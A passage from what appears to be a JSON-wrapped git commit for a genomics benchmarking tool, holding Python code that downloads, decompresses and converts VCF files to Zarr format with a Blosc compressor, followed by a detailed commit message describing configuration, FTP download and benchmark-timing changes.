{}\".format(file_counter, file_list_total,\n                                                                                  file_path_local))\n        file_counter = file_counter + 1\n\n\ndef fetch_file_from_url(url, local_file):\n    urllib.request.urlretrieve(url, local_file)\n\n\ndef decompress_gzip(local_file_gz, local_file):\n    with open(local_file, 'wb') as file_out, gzip.open(local_file_gz, 'rb') as file_in:\n        shutil.copyfileobj(file_in, file_out)\n\n\ndef process_data_files(input_dir, temp_dir, output_dir):\n    \"\"\"\n    Iterates through all files in input_dir and processes *.vcf.gz files to *.vcf, placed in output_dir.\n    Additionally moves *.vcf files to output_dir\n    Note: This method searches through all subdirectories within input_dir, and files are placed in root of output_dir.\n    :param input_dir: The input directory containing files to process\n    :param temp_dir: The temporary directory for unzipping *.gz files, etc.\n    :param output_dir: The output directory where processed *.vcf files should go\n    :type input_dir: str\n    :type temp_dir: str\n    :type output_dir: str\n    \"\"\"\n\n    # Ensure input, temp, and output directory paths are in str format, not pathlib\n    input_dir = str(input_dir)\n    temp_dir = str(temp_dir)\n    output_dir = str(output_dir)\n\n    # Create input, temp, and output directories if they do not exist\n    create_directory_tree(input_dir)\n    create_directory_tree(temp_dir)\n    create_directory_tree(output_dir)\n\n    # Iterate through all *.gz files in input directory and uncompress them to the temporary directory\n    pathlist_gz = pathlib.Path(input_dir).glob(\"**/*.gz\")\n    for path in pathlist_gz:\n        path_str = str(path)\n        file_output_str = path_leaf(path_str)\n        file_output_str = file_output_str[0:len(file_output_str) - 3]  # Truncate *.gz from input filename\n        path_temp_output = str(pathlib.Path(temp_dir, file_output_str))\n        print(\"[Setup][Data] Decompressing file: {}\".format(path_str))\n        print(\"  - Output: {}\".format(path_temp_output))\n\n        # Decompress the .gz file\n        decompress_gzip(path_str, path_temp_output)\n\n    # Iterate through all files in temporary directory and move *.vcf files to output directory\n    pathlist_vcf_temp = pathlib.Path(temp_dir).glob(\"**/*.vcf\")\n    for path in pathlist_vcf_temp:\n        path_temp_str = str(path)\n        filename_str = path_leaf(path_temp_str)  # Strip filename from path\n        path_vcf_str = str(pathlib.Path(output_dir, filename_str))\n\n        shutil.move(path_temp_str, path_vcf_str)\n\n    # Remove temporary directory\n    remove_directory_tree(temp_dir)\n\n    # Copy any *.vcf files already in input directory to the output directory\n    pathlist_vcf_input = pathlib.Path(input_dir).glob(\"**/*.vcf\")\n    for path in pathlist_vcf_input:\n        path_input_str = str(path)\n        filename_str = path_leaf(path_input_str)  # Strip filename from path\n        path_vcf_str = str(pathlib.Path(output_dir, filename_str))\n\n        shutil.copy(path_input_str, path_vcf_str)\n\n\ndef path_head(path):\n    head, tail = os.path.split(path)\n    return head\n\n\ndef path_leaf(path):\n    head, tail = os.path.split(path)\n    return tail or os.path.basename(head)\n\n\ndef read_file_contents(local_filepath):\n    if os.path.isfile(local_filepath):\n        with open(local_filepath) as f:\n            data = f.read()\n            return data\n    else:\n        return None\n\n\ndef setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config):\n    \"\"\"\n    Converts all VCF files in input directory to Zarr format, placed in output directory,\n    based on conversion configuration parameters\n    :param input_vcf_dir: The input directory where VCF files are located\n    :param output_zarr_dir: The output directory to place Zarr-formatted data\n    :param conversion_config: Configuration data for the conversion\n    :type input_vcf_dir: str\n    :type output_zarr_dir: str\n    :type conversion_config: config.VCFtoZarrConfigurationRepresentation\n    \"\"\"\n    # Ensure input and output directory paths are in str format, not pathlib\n    input_vcf_dir = str(input_vcf_dir)\n    output_zarr_dir = str(output_zarr_dir)\n\n    # Create input and output directories if they do not exist\n    create_directory_tree(input_vcf_dir)\n    create_directory_tree(output_zarr_dir)\n\n    # Iterate through all *.vcf files in input directory and convert to Zarr format\n    pathlist_vcf = pathlib.Path(input_vcf_dir).glob(\"**/*.vcf\")\n    for path in pathlist_vcf:\n        path_str = str(path)\n        file_output_str = path_leaf(path_str)\n        file_output_str = file_output_str[0:len(file_output_str) - 4]  # Truncate *.vcf from input filename\n        path_zarr_output = str(pathlib.Path(output_zarr_dir, file_output_str))\n        print(\"[Setup][Data] Converting VCF file to Zarr format: {}\".format(path_str))\n        print(\"  - Output: {}\".format(path_zarr_output))\n\n        # Convert to Zarr format\n        convert_to_zarr(input_vcf_path=path_str,\n                        output_zarr_path=path_zarr_output,\n                        conversion_config=conversion_config)\n\n\ndef convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):\n    \"\"\" Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.\n    :param input_vcf_path: The input VCF file location\n    :param output_zarr_path: The desired Zarr output location\n    :param conversion_config: Configuration data for the conversion\n    :type input_vcf_path: str\n    :type output_zarr_path: str\n    :type conversion_config: config.VCFtoZarrConfigurationRepresentation\n    \"\"\"\n    if conversion_config is not None:\n        # Ensure var is string, not pathlib.Path\n        output_zarr_path = str(output_zarr_path)\n\n        # Get alt number\n        if conversion_config.alt_number is None:\n            print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\")\n            # Scan VCF file to find max number of alleles in any variant\n            callset = allel.read_vcf(input_vcf_path, fields=['numalt'], log=sys.stdout)\n            numalt = callset['variants/numalt']\n            alt_number = np.max(numalt)\n        else:\n            print(\"[VCF-Zarr] Using alt number provided in configuration.\")\n            # Use the configuration-provided alt number\n            alt_number = conversion_config.alt_number\n        print(\"[VCF-Zarr] Alt number: {}\".format(alt_number))\n\n        # Get chunk length\n        chunk_length = allel.vcf_read.DEFAULT_CHUNK_LENGTH\n        if conversion_config.chunk_length is not None:\n            chunk_length = conversion_config.chunk_length\n        print(\"[VCF-Zarr] Chunk length: {}\".format(chunk_length))\n\n        # Get chunk width\n        chunk_width = allel.vcf_read.DEFAULT_CHUNK_WIDTH\n        if conversion_config.chunk_width is not None:\n            chunk_width = conversion_config.chunk_width\n        print(\"[VCF-Zarr] Chunk width: {}\".format(chunk_width))\n\n        if conversion_config.compressor == \"Blosc\":\n            compressor = Blosc(cname=conversion_config.blosc_compression_algorithm,\n                               clevel=conversion_config.blosc_compression_level,\n                               shuffle=conversion_config.blosc_shuffle_mode)\n        else:\n            raise ValueError(\"Unexpected compressor type specified.\")\n\n        print(\"[VCF-Zarr] Using {} compressor.\".format(conversion_config.compressor))\n\n        print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\")\n        # Perform the VCF to Zarr conversion\n        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,\n                          log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)\n        print(\"[VCF-Zarr] Done.\")\n"}}, "msg": "Implement Benchmark Process (#29)\n\n* Update project environment, default config file, and AUTHORS\r\n\r\n-Update .gitignore to ignore test config file and IntelliJ IDEA project files\r\n-Update AUTHORS file with new contributor\r\n-Environment: Add perf and numcodecs libraries as dependencies\r\n-Config file: Update file to include spaces for consistency\r\n-Update benchmark config file to include new (future) options for ftp download and data conversion\r\n\r\n* Remove IntelliJ IDE files from code base\r\n\r\n* -Create config.py to hold functions/data for config file parsing and handling\r\n-cli.py: Move configuration-related functions to config.py & create main() function\r\n-test_cli.py: Move configuration-related unit tests to test_config.py\r\n-Update README.md to show that -f flag can be used when generating a configuration file\r\n\r\n* Add placeholder methods for unit testing: generate default configuration w/ and w/o -f flag\r\n\r\n* Begin implementing \"setup\" command, including download of files over FTP\r\n\r\n- cli.py: Add logic when running in setup mode\r\n- config.py: Add ability to read/parse configuration settings related to FTP downloader\r\n- data_service.py: Implement ftp downloading, including the ability to download all files within a remote ftp directory (recursive download)\r\n- test_data_service.py: Add unit tests for ftp download checking\r\n\r\n* Add unittest for default configuration file generation\r\n\r\n* Update config unittests\r\n\r\n- test_config.py: Add two new unit tests to ensure that a file is not overwritten normally, and that a file is overwritten while using the overwrite flag\r\n\r\n* Add two files needed for data service unit testing and update .gitignore\r\n\r\n- Update .gitignore to only ignore root level data directory\r\n- Add two missing files needed for unit testing Data Service\r\n\r\n* WIP: Add VCF to Zarr conversion (currently only uses Blosc compressor with no user configuration availalbe)\r\n\r\n* FTP Bugfix: Create local directory if it does not exist, before trying to save files to local directory\r\n\r\n* VCF to Zarr: Take downloaded files (vcf, vcf.gz) and organize them to prepare for Zarr conversion during benchmark execution\r\n\r\n* core.py: Follow PEP8\r\n\r\n* Add ability to control VCF to Zarr conversion settings from configuration file (Blosc compressor only for now)\r\n\r\nAvailable Blosc compressor algorithms: zstd, blosclz, lz4, lz4hc, zlib, snappy\r\n\r\n* Convert VCF to Zarr during Setup mode\r\n\r\n- Restructure/add new folders for dataset storage\r\n- Add conversion of VCF files to Zarr format during Setup mode\r\n- data-service: Create function to remove directory tree\r\n- Various code cleanup/formatting\r\n\r\n* Add benchmarking configuration options and parsing\r\n\r\n*  - Move data directory declarations to a separate class in data_service\r\n - Add skeleton code to benchmark core\r\n\r\n* - cli.py: Use run_(timestamp) as default label for benchmark, pass label into benchmark core\r\n- config.py: Store VCF to Zarr conversion config data in Benchmark configuration data so that settings are known when running the benchmark\r\n- core.py: Begin implementation of benchmark process, create BenchmarkRunner class to time different tasks, add benchmarking of vcf to zarr conversion process, save benchmark results to psv file\r\n- data_service.py: Update benchmark_vcf_to_zarr function to have hooks for benchmark timing when needed\r\n- requirements.txt: Add pandas to list of requirements, which is used for storing benchmark results\r\n\r\n* Code cleanup and paramater documentation\r\n\r\n* Rename BenchmarkRunner to BenchmarkProfiler, create new Benchmark class to hold all benchmarking-related code\r\n\r\n- Rename BenchmarkRunner to BenchmarkProfiler class\r\n- Add two unittest method stubs\r\n- core.py: Move benchmarking process inside new Benchmark Class for better code organization/separation\r\n- core.py: Move record_runtime function to internal function within BenchmarkProfiler class\r\n\r\n* Implement unit tests for benchmark profiler and results data\r\n\r\n* Update comment for clarity\r\n\r\n* data_service: Create function that returns genotype data from callset\r\n  Supports data sets with differing formats (e.g. callset/GT vs. callset/genotype)\r\n\r\n* Bugfix: Use an OrderedDict instead of dict to contain benchmark results. Previously, order was not preserved on Linux- and Mac-based systems using Python 3.5\r\n\r\n* numcodecs: remove unused imports\r\n\r\n* Remove unused imports for module (resulting in circular references?)"}}}